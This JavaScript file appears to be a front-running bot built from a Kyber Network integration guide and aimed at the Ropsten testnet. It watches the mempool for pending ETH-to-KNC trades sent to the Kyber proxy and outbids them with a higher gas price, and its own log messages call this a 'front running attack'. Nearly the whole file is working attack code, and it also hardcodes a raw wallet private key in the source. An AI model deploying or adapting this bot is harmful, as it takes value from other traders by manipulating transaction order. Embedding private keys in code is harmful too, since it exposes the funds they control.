// https://developer.kyber.network/docs/Integrations-Web3Guide/

var Web3 = require('web3');
var fetch = require('node-fetch');
var Tx = require('ethereumjs-tx').Transaction;

const web3 = new Web3(new Web3.providers.HttpProvider("https://ropsten.infura.io"));
const NETWORK_URL = "https://ropsten-api.kyber.network";

// KyberNetworkProxy
const KYBER_NETWORK_PROXY = '0x818E6FECD516Ecc3849DAf6845e3EC868087B755';

// Representation of ETH as an address on Ropsten
const ETH_TOKEN_ADDRESS = '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee';
// KNC contract address on Ropsten
const KNC_TOKEN_ADDRESS = '0x4E470dc7321E84CA96FcAEDD0C8aBCebbAEB68C6';
// method id
const TRADE_WITH_HINT = '0x29589f61';
const TRADE = '0xcb3c28c7';
// wallet address for fee sharing program
const REF_ADDRESS = "0x0000000000000000000000000000000000000000"
const ETH_DECIMALS = 18;
const KNC_DECIMALS = 18;
// How many KNC you want to buy
const KNC_QTY = 10;
// How many ETH you want to sell
const ETH_QTY = 0.1;
const ETH_QTY_WEI = ETH_QTY * 10 ** ETH_DECIMALS;
// threshold to trigger front running attack
const THRESHOLD = 0.1;
// Gas price of the transaction
const GAS_PRICE = 'high';
// one gwei
const ONE_GWEI = 1e9;
// max gas price
const MAX_GAS_PRICE = 50000000000;
// Your Ethereum wallet address
const USER_ACCOUNT = '0xd0ee49F0B17144CF7D046c4EF442003D89b84e50';
// Your private key
const PRIVATE_KEY = Buffer.from('F06AC31EC8660085CA78727B72B8EE6C39281614315F772CCA2BF18919750D93', 'hex');

// if the front run has succeed
var succeed = false;

async function main() {
    // get pending transactions
    const web3Ws = new Web3(new Web3.providers.WebsocketProvider("wss://ropsten.infura.io/ws"));
    var subscription = await web3Ws.eth.subscribe('pendingTransactions', async function (error, result) {
    }).on("data", async function (transactionHash) {
        let transaction = await web3.eth.getTransaction(transactionHash);
        await handleTransaction(transaction);
        if (succeed) {
            console.log("Front-running attack succeed.");
            return
        }
        /* web3.eth.getTransaction(transactionHash)
            .then(async function (transaction) {
                await handleTransaction(transaction);
                if (succeed) {
                    console.log("Front-running attack succeed.");
                    return
                }
            }); */
    })
}

async function handleTransaction(transaction) {
    if (transaction['to'] == KYBER_NETWORK_PROXY && await isPending(transaction['hash'])) {
        console.log("Found pending Kyber network transaction", transaction);
    } else {
        return
    } 
    let gasPrice = parseInt(transaction['gasPrice']);
    let newGasPrice = gasPrice + ONE_GWEI;
    if (newGasPrice > MAX_GAS_PRICE) {
        newGasPrice = MAX_GAS_PRICE;
    }
    console.log(newGasPrice, transaction);
    if (triggersFrontRun(transaction)) {
        console.log('Perform front running attack...');
        await performTrade(ETH_QTY, newGasPrice);
        // wait until the honest transaction is done
        while (await isPending(transaction['hash'])) { }
        succeed = true;
    }
}

function triggersFrontRun(transaction) {
    if (transaction['to'] != KYBER_NETWORK_PROXY) {
        return false
    }
    let data = parseTx(transaction['input']);
    let method = data[0], params = data[1];
    if (method == TRADE || method == TRADE_WITH_HINT) {
        let srcAddr = params[0], srcAmount = params[1], toAddr = params[2];
        return (srcAddr == ETH_TOKEN_ADDRESS) && 
                    (toAddr == KNC_TOKEN_ADDRESS) && (srcAmount >= THRESHOLD)
    }
    return false
}

async function performTrade(srcAmount, gasPrice) {
    console.log('Begin transaction...');

    let destAmount = await getQuoteAmount(ETH_TOKEN_ADDRESS, KNC_TOKEN_ADDRESS, srcAmount);
    let tradeDetailsRequest = await fetch(
        `${NETWORK_URL}/trade_data?user_address=` +
        USER_ACCOUNT +
        "&src_id=" +
        ETH_TOKEN_ADDRESS +
        "&dst_id=" +
        KNC_TOKEN_ADDRESS +
        "&src_qty=" +
        srcAmount +
        "&min_dst_qty=" +
        destAmount +
        "&gas_price=" +
        GAS_PRICE
        // "&wallet_id=" +
        // WALLET_ID
    );
    let tradeDetails = await tradeDetailsRequest.json();
    // console.log(tradeDetails);
    // Extract the raw transaction details
    /*if (!(tradeDetails && tradeDetails.length)) {
        console.log("error");
        return
    }*/
    let rawTx = tradeDetails.data[0];
    rawTx['gasPrice'] = '0x' + gasPrice.toString(16);
    console.log("Planning to send: ", rawTx);
    // Create a new transaction
    let tx = new Tx(rawTx, { 'chain': 'ropsten' });
    // Signing the transaction
    tx.sign(PRIVATE_KEY);
    // Serialise the transaction (RLP encoding)
    let serializedTx = tx.serialize();
    // Broadcasting the transaction
    txReceipt = await web3.eth
        .sendSignedTransaction("0x" + serializedTx.toString("hex"))
        .catch(error => console.log(error));
    // Log the transaction receipt
    console.log("Transaction DONE! Receipt: ", txReceipt);
}

async function getQuoteAmount(srcToken, destToken, srcQty) {
    let quoteAmountRequest = await fetch(`${NETWORK_URL}/quote_amount?base=${srcToken}&quote=${destToken}&base_amount=${srcQty}&type=sell`)
    let quoteAmount = await quoteAmountRequest.json();
    quoteAmount = quoteAmount.data;
    return quoteAmount * 0.97;
}

async function isPending(transactionHash) {
    return await web3.eth.getTransaction(transactionHash)['blockHash'] == null
}

function parseTx(input) {
    if (input == '0x') {
        return ['0x', []]
    }
    if ((input.length - 8 - 2) % 64 != 0) {
        throw "Data size misaligned with parse request."
    }
    let method = input.substring(0, 10);
    let numParams = (input.length - 8 - 2) / 64;
    var params = [];
    for (i = 0; i < numParams; i += 1) {
        let param = parseInt(input.substring(10 + 64 * i, 10 + 64 * (i + 1)), 16);
        params.push(param);
    }
    return [method, params]
}

main();


// for test only
async function test() {
    let transaction = await web3.eth.getTransaction('0x8915ac21825b616d80a919c596f123ae11412b0cdcb62c2f2c72abbdbafa007b');
    console.log(transaction);
    console.log(transaction['gasPrice']);
    let gasPrice = parseInt(transaction['gasPrice']);
    console.log(gasPrice);
    let newGasPrice = gasPrice + ONE_GWEI;
    if (newGasPrice > MAX_GAS_PRICE) {
        newGasPrice = MAX_GAS_PRICE;
    }
    console.log(newGasPrice);
}

// test();